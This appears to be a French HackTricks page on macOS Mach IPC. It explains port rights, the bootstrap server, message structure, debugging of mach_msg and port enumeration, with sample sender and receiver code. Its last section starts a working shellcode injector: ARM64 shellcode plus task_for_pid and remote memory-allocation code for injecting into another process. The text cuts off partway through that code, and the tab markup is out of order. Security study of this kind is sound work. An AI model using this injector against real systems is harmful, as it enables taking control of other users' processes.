# macOS IPC - Communication Inter Processus

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.

</details>

## Messagerie Mach via Ports

### Informations de base

Mach utilise des **tâches** comme **unité la plus petite** pour le partage de ressources, et chaque tâche peut contenir **plusieurs threads**. Ces **tâches et threads sont mappés 1:1 sur des processus et threads POSIX**.

La communication entre les tâches se fait via la Communication Inter-Processus (IPC) de Mach, en utilisant des canaux de communication unidirectionnels. **Les messages sont transférés entre des ports**, qui agissent comme des **files d'attente de messages** gérées par le noyau.

Un **port** est l'**élément de base** de l'IPC de Mach. Il peut être utilisé pour **envoyer des messages et les recevoir**.

Chaque processus a une **table IPC**, où il est possible de trouver les **ports Mach du processus**. Le nom d'un port Mach est en fait un nombre (un pointeur vers l'objet du noyau).

Un processus peut également envoyer un nom de port avec certains droits **à une tâche différente** et le noyau fera apparaître cette entrée dans la **table IPC de l'autre tâche**.

### Droits de Port

Les droits de port, qui définissent les opérations qu'une tâche peut effectuer, sont essentiels pour cette communication. Les **droits de port possibles** sont ([définitions d'ici](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)) :

* Le **droit de réception**, qui permet de recevoir des messages envoyés au port. Les ports Mach sont des files d'attente MPSC (multiproducteur, monoclient), ce qui signifie qu'il ne peut y avoir qu'**un seul droit de réception pour chaque port** dans tout le système (contrairement aux tubes, où plusieurs processus peuvent tous détenir des descripteurs de fichier pour l'extrémité de lecture d'un tube).
* Une **tâche avec le droit de réception** peut recevoir des messages et **créer des droits d'envoi**, lui permettant d'envoyer des messages. À l'origine, seule la **propre tâche a le droit de réception sur son port**.
* Si le propriétaire du droit de réception **meurt** ou le tue, le **droit d'envoi devient inutile (nom mort)**.
* Le **droit d'envoi**, qui permet d'envoyer des messages au port.
* Le droit d'envoi peut être **cloné** afin qu'une tâche possédant un droit d'envoi puisse cloner le droit et **l'accorder à une troisième tâche**.
* Notez que les **droits de port** peuvent également être **transmis** via des messages Mac.
* Le **droit d'envoi unique**, qui permet d'envoyer un message au port puis disparaît.
* Ce droit ne peut pas être **cloné**, mais il peut être **déplacé**.
* Le **droit de jeu de ports**, qui indique un _jeu de ports_ plutôt qu'un seul port. Défiler un message d'un jeu de ports défile un message d'un des ports qu'il contient. Les jeux de ports peuvent être utilisés pour écouter plusieurs ports simultanément, un peu comme `select`/`poll`/`epoll`/`kqueue` dans Unix.
* **Nom mort**, qui n'est pas un droit de port réel, mais simplement un espace réservé. Lorsqu'un port est détruit, tous les droits de port existants sur le port deviennent des noms morts.

**Les tâches peuvent transférer des droits d'ENVOI à d'autres**, leur permettant d'envoyer des messages en retour. **Les droits d'ENVOI peuvent également être clonés, de sorte qu'une tâche puisse dupliquer et donner le droit à une troisième tâche**. Cela, combiné à un processus intermédiaire appelé le **serveur d'amorçage**, permet une communication efficace entre les tâches.

### Ports de Fichiers

Les ports de fichiers permettent d'encapsuler des descripteurs de fichiers dans des ports Mac (en utilisant des droits de port Mach). Il est possible de créer un `fileport` à partir d'un FD donné en utilisant `fileport_makeport` et de créer un FD à partir d'un fileport en utilisant `fileport_makefd`.

### Établir une communication

Comme mentionné précédemment, il est possible d'envoyer des droits en utilisant des messages Mach, cependant, vous **ne pouvez pas envoyer un droit sans déjà avoir un droit** d'envoyer un message Mach. Alors, comment la première communication est-elle établie ?

Pour cela, le **serveur d'amorçage** (**launchd** sur Mac) est impliqué, car **tout le monde peut obtenir un droit d'ENVOI vers le serveur d'amorçage**, il est possible de lui demander un droit d'envoyer un message à un autre processus :

1. La tâche **A** crée un **nouveau port**, obtenant le **droit de RÉCEPTION** dessus.
2. La tâche **A**, étant le détenteur du droit de RÉCEPTION, **génère un droit d'ENVOI pour le port**.
3. La tâche **A** établit une **connexion** avec le **serveur d'amorçage**, et **lui envoie le droit d'ENVOI** pour le port qu'elle a généré au début.
* N'oubliez pas que tout le monde peut obtenir un droit d'ENVOI vers le serveur d'amorçage.
4. La tâche A envoie un message `bootstrap_register` au serveur d'amorçage pour **associer le port donné à un nom** comme `com.apple.taska`.
5. La tâche **B** interagit avec le **serveur d'amorçage** pour exécuter une **recherche d'amorçage pour le nom du service** (`bootstrap_lookup`). Ainsi, le serveur d'amorçage peut répondre, la tâche B lui enverra un **droit d'ENVOI vers un port qu'elle a créé précédemment** dans le message de recherche. Si la recherche est réussie, le **serveur duplique le droit d'ENVOI** reçu de la tâche A et le **transmet à la tâche B**.
* N'oubliez pas que tout le monde peut obtenir un droit d'ENVOI vers le serveur d'amorçage.
6. Avec ce droit d'ENVOI, la **tâche B** est capable d'**envoyer** un **message** **à la tâche A**.
7. Pour une communication bidirectionnelle, généralement la tâche **B** génère un nouveau port avec un droit de **RÉCEPTION** et un droit d'**ENVOI**, et donne le **droit d'ENVOI à la tâche A** pour qu'elle puisse envoyer des messages à la TÂCHE B (communication bidirectionnelle).

Le serveur d'amorçage **ne peut pas authentifier** le nom de service revendiqué par une tâche. Cela signifie qu'une **tâche** pourrait potentiellement **usurper n'importe quelle tâche système**, en revendiquant faussement un nom de service d'autorisation, puis en approuvant chaque demande.

Ensuite, Apple stocke les **noms des services fournis par le système** dans des fichiers de configuration sécurisés, situés dans des répertoires protégés par SIP : `/System/Library/LaunchDaemons` et `/System/Library/LaunchAgents`. Aux côtés de chaque nom de service, le **binaire associé est également stocké**. Le serveur d'amorçage, créera et détiendra un **droit de RÉCEPTION pour chacun de ces noms de service**.

Pour ces services prédéfinis, le **processus de recherche diffère légèrement**. Lorsqu'un nom de service est recherché, launchd démarre le service de manière dynamique. Le nouveau flux de travail est le suivant :

* La tâche **B** initie une **recherche d'amorçage** pour un nom de service.
* **launchd** vérifie si la tâche est en cours d'exécution et si ce n'est pas le cas, la **démarre**.
* La tâche **A** (le service) effectue un **enregistrement d'amorçage** (`bootstrap_check_in()`). Ici, le **serveur d'amorçage** crée un droit d'ENVOI, le conserve, et **transfère le droit de RÉCEPTION à la tâche A**.
* launchd duplique le **droit d'ENVOI et l'envoie à la tâche B**.
* La tâche **B** génère un nouveau port avec un droit de **RÉCEPTION** et un droit d'**ENVOI**, et donne le **droit d'ENVOI à la tâche A** (le svc) pour qu'elle puisse envoyer des messages à la TÂCHE B (communication bidirectionnelle).

Cependant, ce processus s'applique uniquement aux tâches système prédéfinies. Les tâches non système fonctionnent toujours comme décrit initialement, ce qui pourrait potentiellement permettre l'usurpation.

{% hint style="danger" %}
Par conséquent, launchd ne doit jamais planter sinon tout le système plantera.
{% endhint %}
### Un message Mach

[Trouvez plus d'informations ici](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

La fonction `mach_msg`, essentiellement un appel système, est utilisée pour envoyer et recevoir des messages Mach. La fonction nécessite que le message soit envoyé en tant qu'argument initial. Ce message doit commencer par une structure `mach_msg_header_t`, suivie du contenu réel du message. La structure est définie comme suit:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Les processus possédant un _**droit de réception**_ peuvent recevoir des messages sur un port Mach. En revanche, les **expéditeurs** se voient accorder un _**droit d'envoi**_ ou un _**droit d'envoi unique**_. Le droit d'envoi unique est exclusivement pour l'envoi d'un seul message, après quoi il devient invalide.

Le champ initial **`msgh_bits`** est une carte de bits :

- Le premier bit (le plus significatif) est utilisé pour indiquer qu'un message est complexe (plus de détails ci-dessous)
- Le 3e et le 4e sont utilisés par le noyau
- Les **5 bits les moins significatifs de la 2e octet** peuvent être utilisés pour un **bon d'échange** : un autre type de port pour envoyer des combinaisons clé/valeur.
- Les **5 bits les moins significatifs de la 3e octet** peuvent être utilisés pour un **port local**
- Les **5 bits les moins significatifs de la 4e octet** peuvent être utilisés pour un **port distant**

Les types pouvant être spécifiés dans le bon d'échange, les ports locaux et distants sont (depuis [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
Par exemple, `MACH_MSG_TYPE_MAKE_SEND_ONCE` peut être utilisé pour **indiquer** qu'un **droit d'envoi unique** doit être dérivé et transféré pour ce port. Il est également possible de spécifier `MACH_PORT_NULL` pour empêcher le destinataire de pouvoir répondre.

Pour réaliser une **communication bidirectionnelle** facile, un processus peut spécifier un **port mach** dans l'en-tête du message mach appelé le _port de réponse_ (**`msgh_local_port`**) où le **destinataire** du message peut **envoyer une réponse** à ce message.

{% hint style="success" %}
Notez que ce type de communication bidirectionnelle est utilisé dans les messages XPC qui attendent une réponse (`xpc_connection_send_message_with_reply` et `xpc_connection_send_message_with_reply_sync`). Mais **généralement, des ports différents sont créés** comme expliqué précédemment pour créer la communication bidirectionnelle.
{% endhint %}

Les autres champs de l'en-tête du message sont :

- `msgh_size` : la taille de l'ensemble du paquet.
- `msgh_remote_port` : le port sur lequel ce message est envoyé.
- `msgh_voucher_port` : [bons mach](https://robert.sesek.com/2023/6/mach\_vouchers.html).
- `msgh_id` : l'ID de ce message, qui est interprété par le destinataire.

{% hint style="danger" %}
Notez que les **messages mach sont envoyés sur un `port mach`**, qui est un canal de communication **un seul destinataire**, **plusieurs expéditeurs** intégré dans le noyau mach. **Plusieurs processus** peuvent **envoyer des messages** à un port mach, mais à tout moment, seul **un processus peut le lire**.
{% endhint %}

Les messages sont ensuite formés par l'en-tête **`mach_msg_header_t`** suivi du **corps** et de la **trailer** (le cas échéant) et peuvent autoriser une réponse. Dans ces cas, le noyau doit simplement transmettre le message d'une tâche à l'autre.

Un **trailer** est une **information ajoutée au message par le noyau** (ne peut pas être définie par l'utilisateur) qui peut être demandée lors de la réception du message avec les indicateurs `MACH_RCV_TRAILER_<trailer_opt>` (différentes informations peuvent être demandées).

#### Messages complexes

Cependant, il existe d'autres messages plus **complexes**, comme ceux transmettant des droits de port supplémentaires ou partageant de la mémoire, où le noyau doit également envoyer ces objets au destinataire. Dans ces cas, le bit le plus significatif de l'en-tête `msgh_bits` est défini.

Les descripteurs possibles à transmettre sont définis dans [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html) :
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
En 32 bits, tous les descripteurs font 12B et le type de descripteur est dans le 11ème. En 64 bits, les tailles varient.

{% hint style="danger" %}
Le noyau copiera les descripteurs d'une tâche à l'autre mais d'abord **en créant une copie dans la mémoire du noyau**. Cette technique, connue sous le nom de "Feng Shui", a été exploitée dans plusieurs attaques pour faire en sorte que le **noyau copie des données dans sa mémoire** permettant à un processus d'envoyer des descripteurs à lui-même. Ensuite, le processus peut recevoir les messages (le noyau les libérera).

Il est également possible de **transférer des droits de port à un processus vulnérable**, et les droits de port apparaîtront simplement dans le processus (même s'il ne les gère pas).
{% endhint %}

### API des ports Mac

Notez que les ports sont associés à l'espace de noms de la tâche, donc pour créer ou rechercher un port, l'espace de noms de la tâche est également interrogé (plus dans `mach/mach_port.h`):

* **`mach_port_allocate` | `mach_port_construct`**: **Créer** un port.
* `mach_port_allocate` peut également créer un **ensemble de ports**: droit de réception sur un groupe de ports. Chaque fois qu'un message est reçu, le port d'où il provient est indiqué.
* `mach_port_allocate_name`: Changer le nom du port (par défaut un entier sur 32 bits)
* `mach_port_names`: Obtenir les noms de port d'une cible
* `mach_port_type`: Obtenir les droits d'une tâche sur un nom
* `mach_port_rename`: Renommer un port (comme dup2 pour les descripteurs de fichier)
* `mach_port_allocate`: Allouer un nouveau RECEIVE, PORT\_SET ou DEAD\_NAME
* `mach_port_insert_right`: Créer un nouveau droit dans un port où vous avez RECEIVE
* `mach_port_...`
* **`mach_msg`** | **`mach_msg_overwrite`**: Fonctions utilisées pour **envoyer et recevoir des messages mach**. La version overwrite permet de spécifier un tampon différent pour la réception du message (l'autre version le réutilisera simplement).

### Déboguer mach\_msg

Comme les fonctions **`mach_msg`** et **`mach_msg_overwrite`** sont celles utilisées pour envoyer et recevoir des messages, définir un point d'arrêt sur elles permettrait d'inspecter les messages envoyés et reçus.

Par exemple, commencez à déboguer n'importe quelle application que vous pouvez déboguer car elle chargera **`libSystem.B` qui utilisera cette fonction**.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Point d'arrêt 1: où = libsystem_kernel.dylib`mach_msg, adresse = 0x00000001803f6c20
<strong>(lldb) r
</strong>Processus 71019 lancé : '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Processus 71019 arrêté
* thread #1, file d'attente = 'com.apple.main-thread', raison d'arrêt = point d'arrêt 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 &#x3C;+0>:  pacibsp
0x181d3ac24 &#x3C;+4>:  sub    sp, sp, #0x20
0x181d3ac28 &#x3C;+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c &#x3C;+12>: add    x29, sp, #0x10
Cible 0: (SandboxedShellApp) arrêtée.
<strong>(lldb) bt
</strong>* thread #1, file d'attente = 'com.apple.main-thread', raison d'arrêt = point d'arrêt 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&#x26;) const::$_0::operator()() const + 168
</code></pre>

Pour obtenir les arguments de **`mach_msg`**, vérifiez les registres. Voici les arguments (de [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
Obtenez les valeurs des registres :
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
Inspectez l'en-tête du message en vérifiant le premier argument :
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
Ce type de `mach_msg_bits_t` est très courant pour permettre une réponse.



### Énumérer les ports
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
Le **nom** est le nom par défaut donné au port (vérifiez comment il **augmente** dans les 3 premiers octets). L'**`ipc-object`** est l'**identifiant** unique **obfusqué** du port.\
Notez également comment les ports avec seulement le droit **`send`** permettent d'**identifier le propriétaire** (nom du port + pid).\
Notez également l'utilisation du **`+`** pour indiquer **d'autres tâches connectées au même port**.

Il est également possible d'utiliser [**procesxp**](https://www.newosxbook.com/tools/procexp.html) pour voir également les **noms de service enregistrés** (avec SIP désactivé en raison du besoin de `com.apple.system-task-port`) :
```
procesp 1 ports
```
Vous pouvez installer cet outil sur iOS en le téléchargeant depuis [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Exemple de code

Notez comment l'**expéditeur** alloue un port, crée un **droit d'envoi** pour le nom `org.darlinghq.example` et l'envoie au **serveur de démarrage** tandis que l'expéditeur demande le **droit d'envoi** de ce nom et l'utilise pour **envoyer un message**.

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

### Ports Privilégiés

* **Port hôte**: Si un processus a le privilège **Envoyer** sur ce port, il peut obtenir des **informations** sur le **système** (par exemple, `host_processor_info`).
* **Port hôte privilégié**: Un processus avec le droit **Envoyer** sur ce port peut effectuer des **actions privilégiées** comme charger une extension de noyau. Le **processus doit être root** pour obtenir cette permission.
* De plus, pour appeler l'API **`kext_request`**, il est nécessaire d'avoir d'autres autorisations **`com.apple.private.kext*`** qui ne sont données qu'aux binaires Apple.
* **Port de nom de tâche**: Une version non privilégiée du _port de tâche_. Il fait référence à la tâche, mais ne permet pas de la contrôler. La seule chose qui semble être disponible à travers lui est `task_info()`.
* **Port de tâche** (alias port de noyau)**:** Avec la permission d'envoi sur ce port, il est possible de contrôler la tâche (lecture/écriture en mémoire, création de threads...).
* Appelez `mach_task_self()` pour **obtenir le nom** de ce port pour la tâche appelante. Ce port n'est **hérité** qu'à travers **`exec()`**; une nouvelle tâche créée avec `fork()` obtient un nouveau port de tâche (dans un cas particulier, une tâche obtient également un nouveau port de tâche après `exec()` dans un binaire suid). La seule façon de créer une tâche et d'obtenir son port est d'effectuer la ["danse d'échange de port"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) tout en faisant un `fork()`.
* Voici les restrictions d'accès au port (de `macos_task_policy` du binaire `AppleMobileFileIntegrity`):
* Si l'application a l'autorisation **`com.apple.security.get-task-allow`**, les processus du **même utilisateur peuvent accéder au port de tâche** (communément ajouté par Xcode pour le débogage). Le processus de **notarisation** ne le permettra pas pour les versions de production.
* Les applications avec l'autorisation **`com.apple.system-task-ports`** peuvent obtenir le **port de tâche pour n'importe quel** processus, sauf le noyau. Dans les anciennes versions, cela s'appelait **`task_for_pid-allow`**. Cela n'est accordé qu'aux applications Apple.
* **Root peut accéder aux ports de tâche** des applications **non** compilées avec un **runtime renforcé** (et non provenant d'Apple).

### Injection de code shell dans un thread via le port de tâche

Vous pouvez obtenir un code shell à partir de :

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %} 
### Fichier `entitlements.plist`

Le fichier `entitlements.plist` contient les autorisations spéciales accordées à une application macOS. Ces autorisations définissent les capacités supplémentaires dont une application peut disposer, telles que l'accès à des ressources sensibles ou des fonctionnalités système. Il est essentiel de gérer correctement les autorisations dans ce fichier pour garantir la sécurité et la confidentialité des données sur un système macOS.
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

**Compiler** le programme précédent et ajoutez les **droits** nécessaires pour pouvoir injecter du code avec le même utilisateur (sinon vous devrez utiliser **sudo**).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
